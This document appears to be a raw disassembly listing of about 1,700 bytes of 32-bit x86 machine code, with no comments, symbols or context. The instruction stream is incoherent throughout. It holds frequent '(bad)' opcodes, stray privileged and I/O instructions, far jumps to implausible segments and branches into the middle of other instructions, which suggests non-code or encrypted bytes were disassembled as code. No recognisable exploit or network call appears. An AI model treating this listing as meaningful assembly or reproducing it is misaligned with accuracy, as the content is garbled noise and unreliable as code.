  41a9b7:	loopne 0x41a9a5
  41a9b9:	pusha  
  41a9ba:	pop    esp
  41a9bb:	jnp    0x41a9af
  41a9bd:	jns    0x41aa20
  41a9bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9c0:	test   al,0x76
  41a9c2:	lods   eax,DWORD PTR ds:[esi]
  41a9c3:	sbb    eax,0x60127824
  41a9c8:	jl     0x41a9e5
  41a9ca:	push   esp
  41a9cb:	shr    DWORD PTR [esp+ecx*4+0x2c],1
  41a9cf:	pop    ss
  41a9d0:	out    dx,al
  41a9d1:	into   
  41a9d2:	call   0x635e81c5
  41a9d7:	je     0x41a9d6
  41a9d9:	sbb    eax,0x5520fccd
  41a9de:	inc    edx
  41a9df:	or     al,0x5c
  41a9e1:	gs adc eax,ebx
  41a9e4:	xchg   ebx,eax
  41a9e5:	aam    0xfb
  41a9e7:	jne    0x41a9d4
  41a9e9:	lock pop ebx
  41a9eb:	(bad)  [esi+eiz*8-0x2b]
  41a9ef:	add    edi,DWORD PTR [esi+edx*8]
  41a9f2:	cs mov dh,0xd4
  41a9f5:	sub    bl,BYTE PTR gs:[ebx]
  41a9f8:	sub    DWORD PTR [ecx-0x3d],edi
  41a9fb:	adc    ch,BYTE PTR [eax]
  41a9fd:	gs mov esp,0xd325b4d7
  41aa03:	xchg   ebp,eax
  41aa04:	sbb    eax,0xab1d116e
  41aa09:	test   al,0xf7
  41aa0b:	shl    DWORD PTR [ebx],0x7f
  41aa0e:	stos   BYTE PTR es:[edi],al
  41aa0f:	jb     0x41a9fb
  41aa11:	cli    
  41aa12:	xchg   edx,eax
  41aa13:	(bad)  
  41aa14:	xor    eax,0xd151a014
  41aa19:	aam    0x6f
  41aa1b:	sbb    BYTE PTR [eax],cl
  41aa1d:	ret    
  41aa1e:	test   ah,0x39
  41aa21:	shl    DWORD PTR [ecx],cl
  41aa23:	mov    ?,WORD PTR [ecx+eiz*4-0x445749c4]
  41aa2a:	cld    
  41aa2b:	mov    ch,ah
  41aa2d:	lods   al,BYTE PTR ds:[esi]
  41aa2e:	cdq    
  41aa2f:	jg     0x41a9de
  41aa31:	dec    ecx
  41aa32:	je     0x41a9bc
  41aa34:	loope  0x41aa45
  41aa36:	cmp    edi,DWORD PTR [edi]
  41aa38:	add    eax,0x534ef243
  41aa3d:	add    DWORD PTR [eax+0x5c],edx
  41aa40:	(bad)  
  41aa41:	adc    ecx,DWORD PTR ds:0xd217c203
  41aa47:	xchg   edx,eax
  41aa48:	int3   
  41aa49:	xor    eax,0x8fdb4b05
  41aa4f:	lds    eax,FWORD PTR [esp+eiz*4]
  41aa52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa53:	cmp    eax,0x88269f88
  41aa58:	dec    edi
  41aa59:	cwde   
  41aa5a:	mov    eax,ds:0x50082477
  41aa5f:	arpl   WORD PTR [eax],cx
  41aa61:	jecxz  0x41a9f9
  41aa63:	es inc ecx
  41aa65:	enter  0x7656,0xba
  41aa69:	imul   edx,DWORD PTR [esp+edx*8-0x733a7a63],0xffffff92
  41aa71:	bound  esi,QWORD PTR [edx+eiz*4+0x50834f2]
  41aa78:	jo     0x41aa78
  41aa7a:	jmp    0x2ac241fa
  41aa7f:	lock repz sar esi,cl
  41aa83:	je     0x41aac9
  41aa85:	test   al,0xc5
  41aa87:	push   esi
  41aa88:	icebp  
  41aa89:	mov    ebp,0xab8080f2
  41aa8e:	jmp    0x464f2bcf
  41aa93:	(bad)  
  41aa95:	add    eax,0x5032c9c2
  41aa9a:	repnz (bad) 
  41aa9c:	aas    
  41aa9d:	jne    0x41ab11
  41aa9f:	xor    al,bh
  41aaa1:	push   esi
  41aaa2:	inc    esi
  41aaa3:	mov    ah,0x47
  41aaa5:	ja     0x41ab20
  41aaa7:	enter  0x71f8,0x9a
  41aaab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aaac:	cmp    eax,0x1d8cd2db
  41aab1:	sub    ch,cl
  41aab3:	mov    dl,0x9f
  41aab5:	clc    
  41aab6:	fmul   st,st(0)
  41aab8:	fld    st(3)
  41aaba:	pop    eax
  41aabb:	inc    ebp
  41aabc:	xor    esi,DWORD PTR [esi+0x15dd5e2a]
  41aac2:	out    0x36,eax
  41aac4:	adc    esi,DWORD PTR [ebp+0x14]
  41aac7:	int    0x38
  41aac9:	jle    0x41ab37
  41aacb:	push   ebp
  41aacc:	sub    eax,0xbb8a0973
  41aad1:	out    dx,al
  41aad2:	aad    0xbd
  41aad4:	mov    al,ds:0x49a05536
  41aad9:	lock scas eax,DWORD PTR es:[edi]
  41aadb:	(bad)  
  41aadd:	sub    DWORD PTR [eax],edi
  41aadf:	sbb    al,0x1f
  41aae1:	push   0xffffff9c
  41aae3:	sub    al,0xcf
  41aae5:	stos   BYTE PTR es:[edi],al
  41aae6:	out    0x6a,al
  41aae8:	lods   al,BYTE PTR ds:[esi]
  41aae9:	or     eax,0x6a235e7d
  41aaee:	xchg   DWORD PTR [edx+0x48],esp
  41aaf1:	inc    esp
  41aaf2:	in     eax,0x5a
  41aaf4:	sbb    ch,cl
  41aaf6:	test   DWORD PTR cs:[edx],esi
  41aaf9:	inc    ecx
  41aafa:	mov    ch,0xe1
  41aafc:	ins    BYTE PTR es:[edi],dx
  41aafd:	adc    eax,DWORD PTR [eax]
  41aaff:	sub    dl,BYTE PTR [esi]
  41ab01:	fwait
  41ab02:	jns    0x41ab64
  41ab04:	cmp    bl,BYTE PTR [edx]
  41ab06:	shl    BYTE PTR [ebx],cl
  41ab08:	jb     0x41aa8d
  41ab0a:	lods   eax,DWORD PTR ds:[esi]
  41ab0b:	fisub  WORD PTR [ebx+0x388af7a5]
  41ab11:	arpl   bx,sp
  41ab13:	mov    eax,0xd78c4bbf
  41ab18:	das    
  41ab19:	adc    ecx,DWORD PTR [eax]
  41ab1b:	sub    al,0xbb
  41ab1d:	fwait
  41ab1e:	jo     0x41ab93
  41ab20:	loope  0x41aacd
  41ab22:	mov    al,ds:0xdf580a21
  41ab27:	adc    ah,dl
  41ab29:	pushf  
  41ab2a:	outs   dx,DWORD PTR ds:[esi]
  41ab2b:	and    al,0xc5
  41ab2d:	push   eax
  41ab2e:	sub    BYTE PTR ds:0x2fbc7bd7,0x1c
  41ab35:	xchg   esi,eax
  41ab36:	xchg   esi,eax
  41ab37:	add    eax,0x359e69c0
  41ab3c:	mov    es,WORD PTR [edi-0x4ffedca9]
  41ab42:	mov    dl,0xcb
  41ab44:	lods   eax,DWORD PTR ds:[esi]
  41ab45:	mov    BYTE PTR [eax+ebp*8],ch
  41ab48:	hlt    
  41ab49:	stos   DWORD PTR es:[edi],eax
  41ab4a:	bnd jno 0x41ab05
  41ab4d:	sbb    edx,DWORD PTR [ebx-0x24]
  41ab50:	sbb    edi,esp
  41ab52:	cmc    
  41ab53:	dec    ebx
  41ab54:	lea    eax,[ebx+0x35]
  41ab57:	mov    bh,0x1e
  41ab59:	ficom  DWORD PTR [esi-0xb]
  41ab5c:	clc    
  41ab5d:	inc    edi
  41ab5e:	fwait
  41ab5f:	mov    ebp,0x81283414
  41ab64:	fisub  DWORD PTR [edi-0x59]
  41ab67:	shr    DWORD PTR [ebp+0x13],0x55
  41ab6b:	cmp    al,0x92
  41ab6d:	jmp    0x41ab61
  41ab6f:	lahf   
  41ab70:	mov    ah,0x5a
  41ab72:	sub    eax,0x963dd3f5
  41ab77:	daa    
  41ab78:	aas    
  41ab79:	jl     0x41abb2
  41ab7b:	push   edx
  41ab7c:	pushf  
  41ab7d:	mov    dh,0x10
  41ab7f:	fucomp st(6)
  41ab81:	sub    DWORD PTR ds:0x8c8ed990,edx
  41ab87:	ds sahf 
  41ab89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab8a:	mov    edi,0x7b27608b
  41ab8f:	xchg   edx,eax
  41ab90:	xchg   esi,eax
  41ab91:	sbb    DWORD PTR [ecx],edi
  41ab93:	adc    DWORD PTR [esp+ebp*4+0x598c8d27],ebx
  41ab9a:	xchg   ebx,eax
  41ab9b:	ins    BYTE PTR es:[edi],dx
  41ab9c:	test   al,0x57
  41ab9e:	push   eax
  41ab9f:	sbb    bl,al
  41aba1:	inc    DWORD PTR [eax-0x17]
  41aba4:	cld    
  41aba5:	adc    bl,cl
  41aba7:	test   BYTE PTR [eax+0x61],al
  41abaa:	pop    DWORD PTR [edi+0x49]
  41abad:	scas   ax,WORD PTR es:[edi]
  41abaf:	lahf   
  41abb0:	scas   al,BYTE PTR es:[edi]
  41abb1:	push   ebp
  41abb2:	mov    ds:0xe06a1d5e,al
  41abb7:	mov    ds:0xcff50c45,al
  41abbc:	push   edx
  41abbd:	and    BYTE PTR [ebp+0x3b217f14],0xf4
  41abc4:	pop    esp
  41abc5:	jle    0x41abd8
  41abc7:	sub    ebp,edi
  41abc9:	sub    al,0x88
  41abcb:	loopne 0x41ab6f
  41abcd:	inc    esi
  41abce:	ss jmp 0xf957b0ac
  41abd4:	fst    DWORD PTR [ebp+0x19]
  41abd7:	hlt    
  41abd8:	jne    0x41abe8
  41abda:	sbb    BYTE PTR [edi],cl
  41abdc:	add    DWORD PTR [ebx],0xffffff87
  41abdf:	dec    edi
  41abe0:	dec    eax
  41abe1:	hlt    
  41abe2:	ins    DWORD PTR es:[edi],dx
  41abe3:	jle    0x41ac0c
  41abe5:	shl    BYTE PTR [edi+0x52],1
  41abe8:	in     al,0x5f
  41abea:	mov    ds:0xe4033619,al
  41abef:	popa   
  41abf0:	mov    bl,0x3d
  41abf2:	or     BYTE PTR [ebx+0x54],ch
  41abf5:	mov    ss,WORD PTR [esi]
  41abf7:	sbb    al,0x47
  41abf9:	and    WORD PTR fs:[esi],bp
  41abfd:	ja     0x41ac06
  41abff:	ret    
  41ac00:	add    dl,BYTE PTR [edi]
  41ac02:	dec    esp
  41ac03:	sub    bh,bh
  41ac05:	add    DWORD PTR [ebp-0x16],ecx
  41ac08:	sub    edx,edx
  41ac0a:	xlat   BYTE PTR ds:[ebx]
  41ac0b:	jae    0x41abf4
  41ac0d:	iret   
  41ac0e:	sub    bl,BYTE PTR [ecx]
  41ac10:	les    edi,FWORD PTR [eax-0x46]
  41ac13:	aas    
  41ac14:	mov    DWORD PTR [ebx-0x4f],ebx
  41ac17:	popa   
  41ac18:	pop    ds
  41ac19:	loopne 0x41ac52
  41ac1b:	ins    DWORD PTR es:[edi],dx
  41ac1c:	dec    esp
  41ac1d:	cs xor al,0xbe
  41ac20:	in     al,0xa4
  41ac22:	aas    
  41ac23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac24:	int    0x7
  41ac26:	into   
  41ac27:	mov    ch,dl
  41ac29:	popa   
  41ac2a:	mul    BYTE PTR [esi-0x6c]
  41ac2d:	idiv   BYTE PTR [edi]
  41ac2f:	inc    edx
  41ac30:	fwait
  41ac31:	push   ss
  41ac32:	imul   ebx,DWORD PTR [ebx+0x40],0x5d
  41ac36:	jg     0x41abd3
  41ac38:	fbstp  TBYTE PTR [esi]
  41ac3a:	or     ebx,DWORD PTR [edi-0x55df892a]
  41ac40:	cmp    DWORD PTR ds:0x6308e953,ebx
  41ac46:	rol    BYTE PTR [esi+0x65],0x3d
  41ac4a:	push   eax
  41ac4b:	fnstsw WORD PTR [esi]
  41ac4d:	dec    ecx
  41ac4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac4f:	mov    ds:0xb4ae41e8,al
  41ac54:	mov    ah,0xe4
  41ac56:	das    
  41ac57:	and    al,0xf
  41ac59:	inc    edx
  41ac5a:	rcl    BYTE PTR [edi+0x2d3f0874],cl
  41ac60:	retf   0xfcf3
  41ac63:	mov    BYTE PTR [edi-0x702e4a5a],cl
  41ac69:	sar    BYTE PTR [ebx+0x7b0b8ff7],0x53
  41ac70:	adc    BYTE PTR [ebx+0x7b642cfb],bh
  41ac76:	mov    esp,0xaf654e18
  41ac7b:	xor    BYTE PTR [ebp-0x51abd5f0],dh
  41ac81:	add    DWORD PTR [esi],ebx
  41ac83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac84:	mov    WORD PTR [ebp+0x25d51bb5],es
  41ac8a:	xor    cl,ch
  41ac8c:	xor    cl,BYTE PTR [edi-0x4c]
  41ac8f:	mov    esp,0x4afb8036
  41ac94:	es mov esp,esp
  41ac97:	bound  esp,QWORD PTR [edx+0x744793ce]
  41ac9d:	stc    
  41ac9e:	mov    edi,0x52e60e3d
  41aca3:	mov    WORD PTR [ecx+0x6b63ab8c],ss
  41aca9:	retf   0xf561
  41acac:	dec    ebp
  41acad:	std    
  41acae:	adc    BYTE PTR [edx],al
  41acb0:	pop    es
  41acb1:	enter  0x30e4,0xa8
  41acb5:	je     0x41ac9e
  41acb7:	sub    bl,cl
  41acb9:	sub    eax,edi
  41acbb:	sub    DWORD PTR [edx],esp
  41acbd:	(bad)  
  41acbe:	jae    0x41ac61
  41acc0:	fs pop ebx
  41acc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acc3:	out    dx,eax
  41acc4:	jmp    0x7ff0:0x619cfcaa
  41accb:	add    eax,0xdd89d779
  41acd0:	(bad)  
  41acd1:	mov    ah,0x8e
  41acd3:	sub    BYTE PTR [edi],dh
  41acd5:	inc    edi
  41acd6:	mov    eax,0x8e0e39bc
  41acdb:	mov    eax,0x5b7793
  41ace0:	mov    bl,0xb0
  41ace2:	add    dl,BYTE PTR [esi+ecx*2-0x26602b00]
  41ace9:	dec    esi
  41acea:	adc    DWORD PTR [edi-0x11],ebp
  41aced:	shl    DWORD PTR [ebx],0x3e
  41acf0:	pop    esi
  41acf1:	int    0xa5
  41acf3:	and    BYTE PTR gs:[esi-0x3cfc54f4],cl
  41acfa:	pusha  
  41acfb:	pop    esp
  41acfc:	mov    ds:0xa74e46aa,eax
  41ad01:	je     0x41ad45
  41ad03:	gs pop ebx
  41ad05:	dec    edx
  41ad06:	fdivr  QWORD PTR [ebx]
  41ad08:	(bad)  
  41ad09:	(bad)  
  41ad0a:	xor    DWORD PTR [eax-0xe],edx
  41ad0d:	and    eax,0x5fb63466
  41ad12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad13:	mov    ax,ds:0xf14496c7
  41ad19:	jmp    0x41ad33
  41ad1b:	pop    esp
  41ad1c:	jnp    0x41ace6
  41ad1e:	retf   0x75a
  41ad21:	sahf   
  41ad22:	jne    0x41ad73
  41ad24:	sahf   
  41ad25:	mov    WORD PTR [edx+edi*4+0x40],fs
  41ad29:	ret    
  41ad2a:	pushw  0xfff0
  41ad2d:	push   esi
  41ad2e:	cwde   
  41ad2f:	push   ebp
  41ad30:	pop    esp
  41ad31:	pop    ebp
  41ad32:	cmp    al,0xb4
  41ad34:	rcl    BYTE PTR [esi-0x6e550b51],1
  41ad3a:	icebp  
  41ad3b:	lock xrelease xchg DWORD PTR [edx-0x1a],edi
  41ad40:	adc    esp,ebx
  41ad42:	das    
  41ad43:	fxch   st(1)
  41ad45:	iret   
  41ad46:	inc    edx
  41ad47:	loopne 0x41adb6
  41ad49:	fcmovnbe st,st(7)
  41ad4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad4c:	imul   edx,DWORD PTR [ebp+0x54],0x9713a432
  41ad53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad54:	fwait
  41ad55:	inc    ecx
  41ad56:	or     DWORD PTR [eax+esi*1],esp
  41ad59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad5a:	xchg   ecx,eax
  41ad5b:	push   ebp
  41ad5c:	je     0x41ad66
  41ad5e:	mov    dh,0x63
  41ad60:	dec    edx
  41ad61:	or     DWORD PTR [ebp-0x38],esi
  41ad64:	xchg   ebx,eax
  41ad65:	add    DWORD PTR [edx-0x59022e6b],edx
  41ad6b:	push   es
  41ad6c:	cdq    
  41ad6d:	rol    ebx,0xf9
  41ad70:	shl    DWORD PTR ds:[edx-0x78416d59],cl
  41ad77:	push   esi
  41ad78:	test   al,0xbf
  41ad7a:	xchg   ebx,esp
  41ad7c:	mov    ebx,0xa18c0107
  41ad81:	jae    0x41ad57
  41ad83:	jo     0x41adeb
  41ad85:	cmc    
  41ad86:	xchg   DWORD PTR [edi+0x3b],ebp
  41ad89:	cmp    BYTE PTR [ebp+0xb],0x11
  41ad8d:	xchg   ebx,eax
  41ad8e:	mov    eax,ds:0x62674ddf
  41ad93:	xchg   esp,eax
  41ad94:	add    al,0xf3
  41ad97:	mov    edi,0x49c24358
  41ad9c:	jb     0x41ad63
  41ad9e:	or     cl,dh
  41ada0:	cwde   
  41ada1:	cdq    
  41ada2:	pop    ecx
  41ada4:	adc    ah,BYTE PTR [ebx+0x56a0e9e3]
  41adaa:	test   al,0xe5
  41adac:	jmp    0x41ad4b
  41adae:	pop    ebp
  41adaf:	sar    DWORD PTR [ebp+0x547855f7],cl
  41adb5:	sti    
  41adb6:	arpl   WORD PTR [ebp+0x70],di
  41adb9:	fistp  WORD PTR [esi+0x5866609a]
  41adbf:	daa    
  41adc0:	outs   dx,BYTE PTR ds:[esi]
  41adc1:	shr    BYTE PTR [edx-0x60],cl
  41adc4:	mul    al
  41adc6:	add    al,0xfa
  41adc8:	sub    DWORD PTR [ebp-0x8d41733],ebp
  41adce:	(bad)  
  41adcf:	xchg   esi,eax
  41add0:	pusha  
  41add1:	push   edi
  41add2:	ror    esp,1
  41add4:	aas    
  41add5:	inc    edi
  41add6:	push   eax
  41add7:	cmp    edi,ecx
  41add9:	xor    DWORD PTR [esi],edi
  41addb:	(bad)  
  41addc:	cmp    bl,dl
  41adde:	add    bh,BYTE PTR [eax]
  41ade0:	xlat   BYTE PTR ds:[ebx]
  41ade1:	jns    0x41adac
  41ade3:	in     al,0x0
  41ade5:	ins    BYTE PTR es:[edi],dx
  41ade6:	dec    eax
  41ade7:	ret    0xcbe9
  41adea:	je     0x41adfd
  41adec:	jmp    0x41addb
  41adee:	mov    ah,0xdb
  41adf0:	test   eax,0xee6f6a95
  41adf5:	dec    esp
  41adf6:	cmp    DWORD PTR [bx-0x1df2],esp
  41adfb:	pop    edx
  41adfc:	fsub   DWORD PTR [ebx]
  41adfe:	sbb    eax,0x33480893
  41ae03:	aaa    
  41ae04:	push   ss
  41ae05:	inc    ecx
  41ae06:	mov    ecx,edx
  41ae08:	jle    0x41ade0
  41ae0a:	and    eax,0xb5459602
  41ae0f:	hlt    
  41ae10:	mov    edi,0xce90bc8a
  41ae15:	cld    
  41ae16:	push   ebx
  41ae17:	push   edx
  41ae18:	mov    dh,0xa5
  41ae1a:	bound  esp,QWORD PTR [eax+ecx*1-0x57]
  41ae1e:	sbb    eax,0x859cf06a
  41ae23:	add    eax,0x420d20fc
  41ae28:	mov    eax,ds:0xa4e4ec6d
  41ae2d:	xchg   ebx,eax
  41ae2e:	ins    BYTE PTR es:[edi],dx
  41ae2f:	mov    ds:0x34bb619f,al
  41ae34:	mov    dh,BYTE PTR [edi-0x29c01cbf]
  41ae3a:	xor    BYTE PTR [edi],0x6c
  41ae3d:	xor    bl,ch
  41ae3f:	pusha  
  41ae40:	xchg   ecx,esi
  41ae42:	rcl    BYTE PTR [ebp-0x69],cl
  41ae45:	loop   0x41ae13
  41ae47:	gs sahf 
  41ae49:	das    
  41ae4a:	dec    eax
  41ae4b:	push   esi
  41ae4c:	aaa    
  41ae4d:	popf   
  41ae4e:	fwait
  41ae4f:	push   0x20
  41ae51:	sbb    edx,DWORD PTR [esi+0x49]
  41ae54:	in     al,0x81
  41ae56:	popa   
  41ae57:	jmp    0x7b7d:0x9cef330f
  41ae5e:	push   edi
  41ae5f:	lea    edi,[esi]
  41ae61:	(bad)  
  41ae62:	out    dx,al
  41ae63:	or     al,BYTE PTR [esi-0x65]
  41ae66:	xchg   edi,eax
  41ae67:	std    
  41ae68:	mov    DWORD PTR [eax],ecx
  41ae6a:	lods   eax,DWORD PTR ds:[esi]
  41ae6b:	shl    bh,cl
  41ae6d:	mov    bh,dl
  41ae6f:	cmp    al,0x90
  41ae71:	cli    
  41ae72:	into   
  41ae73:	in     eax,dx
  41ae74:	adc    DWORD PTR [edi+edx*4],esp
  41ae77:	dec    edx
  41ae78:	shl    DWORD PTR [ebx-0x41],cl
  41ae7b:	stos   DWORD PTR es:[edi],eax
  41ae7c:	push   ss
  41ae7d:	mov    ebx,0xf59523e0
  41ae82:	out    dx,eax
  41ae83:	es mov bl,0xe0
  41ae86:	imul   ebx,DWORD PTR [edi-0x8],0xffffff9a
  41ae8a:	lahf   
  41ae8b:	sub    esp,ebp
  41ae8d:	int    0x80
  41ae8f:	ja     0x41ae39
  41ae91:	cmp    eax,0xa5e4cfcd
  41ae96:	push   eax
  41ae97:	xor    ecx,edx
  41ae99:	int    0xd0
  41ae9b:	inc    ebp
  41ae9c:	or     al,0x50
  41ae9e:	leave  
  41ae9f:	xor    BYTE PTR [ecx+0x38],ch
  41aea2:	clc    
  41aea3:	jb     0x41ae41
  41aea5:	jg     0x41ae3a
  41aea7:	mov    ebx,0x56dfc7db
  41aeac:	je     0x41ae59
  41aeae:	ret    
  41aeaf:	lods   al,BYTE PTR ds:[esi]
  41aeb0:	das    
  41aeb1:	cld    
  41aeb2:	xor    al,0x36
  41aeb4:	sub    cl,bl
  41aeb6:	das    
  41aeb7:	or     DWORD PTR [ebp+0x7f],0x3
  41aebb:	data16 lods al,BYTE PTR ds:[esi]
  41aebd:	jno    0x41aef5
  41aebf:	test   al,0xd0
  41aec1:	pop    esi
  41aec2:	fsub   QWORD PTR [edi+0x7aef5a35]
  41aec8:	daa    
  41aec9:	mov    ah,bl
  41aecb:	push   ds
  41aecc:	sub    eax,0xff10577c
  41aed1:	sub    DWORD PTR [eax],0xffffffac
  41aed4:	(bad)  
  41aed5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aed6:	ins    BYTE PTR es:[edi],dx
  41aed7:	or     DWORD PTR [esi-0x1e],eax
  41aeda:	or     bh,bh
  41aedc:	xor    edx,DWORD PTR [ecx-0x6f71c234]
  41aee2:	lods   al,BYTE PTR ds:[esi]
  41aee3:	and    eax,0xac2b7937
  41aee8:	adc    DWORD PTR [ebp-0x4a],0x6
  41aeec:	xchg   ebp,eax
  41aeed:	cmp    DWORD PTR [esi-0x7f3fb313],eax
  41aef3:	pop    ebp
  41aef4:	mov    cl,0x44
  41aef6:	mov    al,0xf1
  41aef8:	push   es
  41aef9:	aam    0x62
  41aefb:	aas    
  41aefc:	push   esp
  41aefd:	pop    edx
  41aefe:	cmp    BYTE PTR [edi+eiz*2],0xce
  41af02:	push   edx
  41af03:	out    0x61,al
  41af05:	scas   eax,DWORD PTR es:[edi]
  41af06:	lahf   
  41af07:	ja     0x41ae92
  41af09:	popf   
  41af0a:	and    DWORD PTR [edi-0x11],edx
  41af0d:	mov    al,0x93
  41af0f:	sub    ebx,eax
  41af11:	adc    ah,BYTE PTR [ebp+0x7c]
  41af14:	std    
  41af15:	sub    bh,BYTE PTR [esi+0x2f]
  41af18:	mov    ebp,0x898cafab
  41af1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af1e:	outs   dx,DWORD PTR ds:[esi]
  41af1f:	pop    ebx
  41af20:	stc    
  41af21:	xchg   ecx,eax
  41af22:	loop   0x41aeb1
  41af24:	repz cmp bh,BYTE PTR [edx-0x18242c24]
  41af2b:	sub    cl,BYTE PTR ds:[ebx+0x27]
  41af2f:	fdiv   DWORD PTR [ebx]
  41af31:	or     esp,eax
  41af33:	stos   DWORD PTR es:[edi],eax
  41af34:	pop    ebx
  41af35:	jnp    0x41af8b
  41af37:	xchg   bh,cl
  41af39:	jge    0x41afb4
  41af3b:	cmp    al,0xa4
  41af3d:	outs   dx,BYTE PTR ds:[esi]
  41af3e:	adc    ecx,DWORD PTR [ecx-0x4e]
  41af41:	cmp    al,0xf4
  41af43:	data16 jne 0x41af59
  41af46:	push   0xffffffde
  41af48:	pop    esp
  41af49:	inc    esi
  41af4a:	pop    edi
  41af4b:	repz dec esi
  41af4d:	mul    DWORD PTR [esi+0x7a]
  41af50:	cld    
  41af51:	js     0x41af81
  41af53:	push   ebx
  41af54:	mov    es,esi
  41af56:	call   0xdd58ce2f
  41af5b:	add    DWORD PTR [esi+0x61],0x28
  41af5f:	cdq    
  41af60:	sahf   
  41af61:	cmp    eax,0x7e952e80
  41af66:	push   es
  41af67:	xor    dl,BYTE PTR ds:0x3c99e7a4
  41af6d:	stc    
  41af6e:	push   ds
  41af6f:	inc    esi
  41af70:	cmp    edi,0xffffff91
  41af73:	sub    al,0x15
  41af75:	popa   
  41af76:	(bad)  
  41af77:	xchg   ecx,eax
  41af78:	inc    ebx
  41af79:	jnp    0x41afb6
  41af7b:	rcl    DWORD PTR [esi],1
  41af7d:	xchg   ecx,eax
  41af7e:	stos   DWORD PTR es:[edi],eax
  41af7f:	cmc    
  41af80:	pop    edi
  41af81:	cld    
  41af82:	in     al,dx
  41af83:	xor    DWORD PTR gs:[edx+0x12],ecx
  41af87:	ja     0x41af83
  41af89:	das    
  41af8a:	ins    DWORD PTR es:[edi],dx
  41af8b:	sub    esp,DWORD PTR [ebp-0x5b]
  41af8e:	dec    esp
  41af8f:	mov    esp,DWORD PTR [eax+edx*4-0x18]
  41af93:	mov    ds:0x12672134,eax
  41af98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af99:	out    0xfd,eax
  41af9b:	sub    ebp,ebx
  41af9d:	sub    DWORD PTR [eax-0x49],0x6e
  41afa1:	or     DWORD PTR [eax],edi
  41afa3:	cmp    eax,0x3b8df4e4
  41afa8:	and    DWORD PTR [eax+0x55c1309b],esp
  41afae:	stc    
  41afaf:	xchg   ecx,eax
  41afb0:	mov    dl,0xe6
  41afb2:	je     0x41af38
  41afb4:	or     eax,DWORD PTR [eax-0x244a41f5]
  41afba:	fmul   DWORD PTR ds:0xe0c334cc
  41afc0:	stos   DWORD PTR es:[edi],eax
  41afc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afc2:	sub    esi,DWORD PTR [edi]
  41afc4:	rol    BYTE PTR [esi],cl
  41afc6:	dec    ebp
  41afc7:	cdq    
  41afc8:	cld    
  41afc9:	sbb    DWORD PTR [esi+0x2d],edx
  41afcc:	shl    BYTE PTR [ecx-0x46],1
  41afcf:	out    dx,eax
  41afd0:	shr    DWORD PTR [edi+0x66],cl
  41afd3:	mov    bl,0x4c
  41afd5:	adc    DWORD PTR [edi-0x3b],edx
  41afd8:	ficom  DWORD PTR [edi-0x7172ced7]
  41afde:	lahf   
  41afdf:	push   ebp
  41afe0:	sbb    eax,0xd22c4f54
  41afe5:	lock mov eax,ds:0xca7e9a6
  41afeb:	xor    bh,BYTE PTR [ecx+0x42]
  41afee:	test   DWORD PTR [edi-0x5a],ebp
  41aff1:	sub    BYTE PTR [edi+0x6b1e383d],bl
  41aff7:	aas    
  41aff8:	sbb    dh,BYTE PTR [ecx+0x101a13b5]
  41affe:	and    al,BYTE PTR [ecx]
  41b000:	imul   esp,esi,0xffffffd9
  41b003:	jecxz  0x41b017
  41b005:	shl    BYTE PTR [edx+ecx*2],cl
  41b008:	add    esi,DWORD PTR [esi+eiz*8+0x16]
  41b00c:	loopne 0x41b043
  41b00e:	inc    ebp
  41b00f:	popf   
  41b010:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b011:	sar    BYTE PTR [ecx-0x2f],1
  41b014:	or     edi,DWORD PTR [ebx]
  41b016:	lds    edx,FWORD PTR [edi+0x7f29e8bc]
  41b01c:	test   dl,al
  41b01e:	fidivr WORD PTR [edi-0x2090240c]
  41b024:	int    0x23
  41b026:	inc    ebp
  41b027:	xchg   ecx,eax
  41b028:	xor    eax,DWORD PTR [esi-0x4f]
  41b02b:	jge    0x41b03f
  41b02d:	sub    al,0x79
  41b02f:	and    al,0x7b
  41b031:	bound  esi,QWORD PTR [eax+0x2a7622dc]
  41b037:	push   ebx
  41b038:	outs   dx,BYTE PTR ds:[esi]
  41b039:	or     al,0x63
  41b03b:	inc    edi
  41b03c:	mov    bh,BYTE PTR [ecx-0x10]
  41b03f:	(bad)  
  41b040:	std    
  41b041:	jns    0x41b02c
  41b043:	scas   al,BYTE PTR es:[edi]
  41b044:	pop    es
  41b045:	pop    ss
  41b046:	cs xchg esi,eax
  41b048:	ins    BYTE PTR es:[edi],dx
  41b049:	cmp    ebp,DWORD PTR [edi]
  41b04b:	mov    ecx,0xd7c2b0f9
  41b050:	add    DWORD PTR [edx],edx
  41b052:	jb     0x41b07b
  41b054:	dec    ebp
  41b055:	(bad)  
  41b056:	lods   al,BYTE PTR ds:[esi]
  41b057:	mov    esp,0x2a7147d7
  41b05c:	into   
  41b05d:	leave  
  41b05e:	in     eax,dx
  41b05f:	add    al,ah
  41b061:	jmp    0xe539:0x51f1134c
  41b068:	sub    ch,BYTE PTR [ebx]
  41b06a:	xchg   BYTE PTR [edi+0x34d3bd71],bh
  41b070:	xor    al,0x8c
  41b072:	xlat   BYTE PTR ds:[ebx]
  41b073:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b074:	pop    ds
  41b075:	(bad)  [esi]
  41b077:	and    DWORD PTR [ebx+0x2a30eab6],esi
  41b07d:	fistp  QWORD PTR [eax-0x24]
  41b080:	cmc    
  41b081:	into   
  41b082:	cmp    dl,BYTE PTR [ecx]
  41b084:	push   edx
  41b085:	outs   dx,DWORD PTR ds:[esi]
  41b086:	cld    
  41b087:	(bad)  
  41b088:	push   esi
  41b089:	inc    BYTE PTR [edx-0x1e]
  41b08c:	cmc    
  41b08d:	jb     0x41b102
  41b08f:	xor    ebx,DWORD PTR [eax]
